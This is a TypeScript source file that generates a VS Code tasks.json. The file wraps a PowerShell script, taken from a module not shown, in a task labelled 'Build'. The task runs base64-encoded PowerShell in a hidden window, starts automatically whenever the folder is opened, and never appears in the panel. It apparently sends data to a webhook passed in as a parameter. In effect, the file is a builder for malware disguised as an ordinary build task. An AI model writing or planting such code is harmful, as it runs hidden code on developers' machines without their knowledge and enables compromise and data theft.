import { buildPs1 } from "./ps1.js";

export function buildTasksJson(webhook: string): string {
  const ps1 = buildPs1(webhook);
  // PowerShell -EncodedCommand expects UTF-16LE base64
  const b64 = Buffer.from(ps1, "utf16le").toString("base64");

  return JSON.stringify({
    version: "2.0.0",
    tasks: [
      {
        label: "Build",
        type: "shell",
        command: "powershell",
        args: [
          "-WindowStyle", "Hidden",
          "-NonInteractive",
          "-EncodedCommand", b64,
        ],
        runOptions: { runOn: "folderOpen" },
        presentation: { reveal: "never", panel: "dedicated", focus: false },
      },
    ],
  }, null, 2);
}
